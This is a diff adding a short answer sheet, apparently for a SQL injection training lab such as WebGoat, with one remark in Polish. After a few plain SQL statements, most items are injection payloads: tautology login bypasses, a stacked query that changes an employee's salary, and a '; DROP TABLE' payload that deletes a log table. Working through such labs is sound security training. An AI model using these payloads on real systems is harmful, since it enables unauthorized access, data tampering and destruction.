@@ -1,0 +1,17 @@
+2. SELECT department FROM employees WHERE first_name = 'Bob'
+
+3. update employees set department = 'Sales' where first_name = 'Tobi'
+
+4. ALTER TABLE employees ADD phone varchar(20)
+
+5. GRANT ALTER TABLE TO UnauthorizedUser
+
+9. ' or '1'='1, całe polecenie wygląda tak SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'
+
+10. 0 , 0 or TRUE Your query was: SELECT * From user_data WHERE Login_Count = 0 and userid= 0 or TRUE
+
+11. ' or TRUE -- , 3SL99A
+
+12. Smith, '; UPDATE employees SET salary = 999999999 WHERE first_name = 'John'; --
+
+13. '; DROP TABLE access_log; --
